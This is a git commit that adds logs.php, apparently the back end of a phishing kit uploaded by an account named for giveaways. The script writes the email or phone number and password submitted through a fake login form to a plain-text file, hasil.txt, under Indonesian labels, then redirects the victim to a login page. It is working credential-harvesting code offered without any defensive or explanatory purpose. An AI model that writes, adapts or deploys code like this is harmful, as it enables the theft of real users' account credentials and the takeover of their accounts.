4f95073bf02bfe93bce377f5d216cc4d848b81e0
GiveawayBerbagi <135326146+GiveawayBerbagi@users.noreply.github.com>
2023-06-02 17:11:45 +0700

    Add files via upload

---
+++ logs.php
@@ -0,0 +1,21 @@
+<?php
+header ("Location: http://localhost/masterpro/FormMasuk.html");
+$ADEx = "hasil.txt";
+$ADEy = $_POST['email'];
+$ADEz = $_POST['pass'];
+
+$handle = fopen($ADEx, 'a');
+fwrite($handle, "++++++++++++++++++++++++++++++++");
+fwrite($handle, "\n");
+fwrite($handle, "Email atau Telepon : ");
+fwrite($handle, "$ADEy");
+fwrite($handle, "\n");
+fwrite($handle, "Kata Sandi         : ");
+fwrite($handle, "$ADEz");
+fwrite($handle, "\n");
+fwrite($handle, "++++++++++++++++++++++++++++++++");
+fwrite($handle, "\n");
+fclose($handle);
+exit;
+?>
+
